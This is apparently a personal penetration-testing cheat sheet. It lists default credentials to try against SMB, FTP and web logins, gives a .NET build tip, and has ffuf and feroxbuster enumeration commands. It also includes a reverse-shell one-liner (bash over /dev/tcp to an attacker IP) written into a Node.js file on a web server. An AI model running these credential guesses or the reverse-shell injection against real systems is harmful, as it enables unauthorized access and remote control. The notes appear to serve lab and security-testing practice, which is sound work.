# General

# Creds to try

If you have access to SMB, FTP, and probably a http login form, try these creds, always.

```jsx
admin:admin
guest:
admin:
%:
root:root
root:toor
guest:guest
anonymous:anonymous
anonymous:
```

## Build .NET project

With Microsoft’s `dotnet` CLI, you can build a .NET project (will probably have `.sln` file with it). 

```jsx
cd /project/directory
dotnet build 
```

![Untitled](General%209e869c69efa440d7a7c140193812915f/Untitled.png)

### Escape single quotes

You can escape single quotes `'` with 2 backslashes

```jsx
echo "require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/192.168.60.1/53 0>&1\\''" > /var/www/node/package.js
```

# Quick Commands

Subdomain enumeration with ffuf

```jsx
ffuf -u http://postfix.off/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.postfix.off" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" -mc all -fs 0 | tee ffuf/subdomain-80
```

Directory enum with feroxbuster

```jsx
feroxbuster -u http://billy:8081/ -w /usr/share/wordlists/kkrypt0nn/directory_scanner/big.txt -m POST,GET -t 35 | tee ffuf/8081pg-ferox
```